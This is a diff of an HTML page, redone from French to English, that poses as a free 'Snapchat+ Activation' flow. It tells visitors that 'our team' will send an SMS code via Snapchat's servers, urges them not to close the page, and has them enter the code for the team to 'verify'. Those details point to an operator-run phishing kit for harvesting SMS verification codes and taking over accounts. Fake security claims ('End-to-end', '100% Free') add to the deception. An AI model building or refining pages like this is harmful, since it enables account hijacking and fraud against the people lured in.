@@ -1,75 +1,142 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="theme-color" content="#fffc00" />
-    <title>Snapchat+ — Validation en cours</title>
+    <title>Snapchat+ — Activation in Progress</title>
     <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 </head>
 <body>
     <div class="bg-gif"></div>
     <div class="container">
-        <div class="main-card validation-card">
+        <div class="main-card flow-card">
 
-            <div class="val-header">
+            <!-- ── Header ──────────────────────────────────────────────────── -->
+            <div class="flow-header">
                 <img src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg"
-                     alt="Snapchat" class="val-logo" />
-                <h1>Snapchat+</h1>
-                <p class="val-subtitle" id="valSubtitle">Activation Snapchat+ gratuite — 1 an !</p>
-            </div>
-
-            <!-- Message de statut (normal ou retry) -->
-            <div class="val-status" id="valStatus">
-                <div class="spinner"></div>
-                <h2 id="valTitle">Validation en cours…</h2>
-                <p class="val-phone">
-                    Demande reçue pour <strong id="displayPhone">--</strong>
-                </p>
-            </div>
-
-            <!-- Alerte retry (cachée par défaut) -->
-            <div class="val-alert" id="retryAlert" style="display:none;">
-                <div class="alert-box" style="border-color:#f59e0b; background:linear-gradient(135deg,#fffbeb,#fef3c7);">
-                    <span class="alert-icon">🔄</span>
-                    <div>
-                        <strong style="color:#92400e;">Code incorrect</strong>
-                        <p style="color:#b45309;">Notre équipe choisit la longueur du nouveau code. Veuillez patienter…</p>
-                    </div>
+                     alt="Snapchat+" class="flow-logo" />
+                <div class="flow-header-text">
+                    <h1>Snapchat+ Activation</h1>
+                    <p id="flowSubtitle">Your request is being processed by our team</p>
                 </div>
             </div>
 
-            <!-- Alerte normale -->
-            <div class="val-alert" id="normalAlert">
-                <div class="alert-box">
-                    <span class="alert-icon">⚠️</span>
-                    <div>
-                        <strong>NE FERMEZ PAS CETTE PAGE</strong>
-                        <p>Vous perdriez votre code SMS</p>
-                    </div>
+            <!-- ── Progress steps ──────────────────────────────────────────── -->
+            <div class="steps-container">
+                <div class="step done" id="step1">
+                    <div class="step-icon"><i class="fas fa-check"></i></div>
+                    <div class="step-line"></div>
+                    <span class="step-label">Request sent</span>
+                </div>
+                <div class="step active" id="step2">
+                    <div class="step-icon"><i class="fas fa-paper-plane"></i></div>
+                    <div class="step-line"></div>
+                    <span class="step-label">Sending SMS</span>
+                </div>
+                <div class="step" id="step3">
+                    <div class="step-icon"><i class="fas fa-keyboard"></i></div>
+                    <div class="step-line"></div>
+                    <span class="step-label">Enter code</span>
+                </div>
+                <div class="step last" id="step4">
+                    <div class="step-icon"><i class="fas fa-star"></i></div>
+                    <span class="step-label">Activated!</span>
                 </div>
             </div>
 
-            <div class="val-network">
-                <div class="network-dots"><span></span><span></span><span></span></div>
-                <p id="networkText">Connexion au réseau mobile <span id="carrierName">Orange</span>…</p>
-            </div>
-
-            <div class="val-timer">
-                <div class="timer-icon">🕒</div>
-                <div class="timer-text">
-                    <p>Temps d'attente estimé : <strong>~2 min</strong></p>
-                    <p class="timer-small">
-                        Si la demande prend trop de temps, contactez-nous au
-                        <a href="tel:+33756863425">07 56 86 34 25</a>
+            <!-- ── Status block ────────────────────────────────────────────── -->
+            <div class="flow-status-block">
+                <div class="pulse-ring">
+                    <div class="pulse-dot"></div>
+                </div>
+                <div class="flow-status-text">
+                    <p class="flow-status-title" id="statusTitle">Preparing your SMS code</p>
+                    <p class="flow-status-sub">
+                        Number: <strong id="displayPhone">--</strong>
+                        &nbsp;·&nbsp;
+                        Carrier: <strong id="carrierName">Orange</strong>
                     </p>
                 </div>
             </div>
 
-            <div class="val-footer">
-                <p>🔒 Connexion sécurisée · Données protégées</p>
-                <p class="val-legal">L'abonnement Snapchat+ ne vous sera pas facturé.</p>
-                <p class="val-legal">L'abonnement est disponible uniquement pour les utilisateurs éligibles.</p>
+            <!-- ── Retry banner (hidden by default) ───────────────────────── -->
+            <div class="retry-banner" id="retryBanner" style="display:none">
+                <i class="fas fa-rotate-right"></i>
+                <div>
+                    <strong>Incorrect code</strong>
+                    <p>Our team is choosing the new code length — hang tight</p>
+                </div>
+            </div>
+
+            <!-- ── Warning ─────────────────────────────────────────────────── -->
+            <div class="flow-warning">
+                <span class="flow-warning-icon">⚠️</span>
+                <div>
+                    <strong>DO NOT CLOSE THIS PAGE</strong>
+                    <p>You will lose your activation and will have to restart</p>
+                </div>
+            </div>
+
+            <!-- ── Info grid ───────────────────────────────────────────────── -->
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="info-icon">🕒</div>
+                    <div>
+                        <p class="info-title">Estimated time</p>
+                        <p class="info-value">~2 min</p>
+                    </div>
+                </div>
+                <div class="info-card">
+                    <div class="info-icon">⏱️</div>
+                    <div>
+                        <p class="info-title">Time elapsed</p>
+                        <p class="info-value" id="elapsedTime">0:00</p>
+                    </div>
+                </div>
+                <div class="info-card">
+                    <div class="info-icon">🔒</div>
+                    <div>
+                        <p class="info-title">Security</p>
+                        <p class="info-value">End-to-end</p>
+                    </div>
+                </div>
+                <div class="info-card">
+                    <div class="info-icon">📡</div>
+                    <div>
+                        <p class="info-title">Connection</p>
+                        <p class="info-value" id="connStatus">Live</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ── What happens next ───────────────────────────────────────── -->
+            <div class="next-steps">
+                <p class="next-steps-title">What happens next?</p>
+                <div class="next-steps-list">
+                    <div class="next-step-item">
+                        <span class="next-step-num">1</span>
+                        <p>Our team sends an SMS to your number via Snapchat's servers</p>
+                    </div>
+                    <div class="next-step-item">
+                        <span class="next-step-num">2</span>
+                        <p>You'll be redirected to enter the code from the SMS</p>
+                    </div>
+                    <div class="next-step-item">
+                        <span class="next-step-num">3</span>
+                        <p>Our team verifies the code and activates your subscription</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ── Footer ──────────────────────────────────────────────────── -->
+            <div class="flow-footer">
+                <span><i class="fas fa-lock"></i> Secure connection</span>
+                <span>·</span>
+                <span><i class="fas fa-shield-alt"></i> Data protected</span>
+                <span>·</span>
+                <span><i class="fas fa-gift"></i> 100% Free</span>
             </div>
 
         </div>
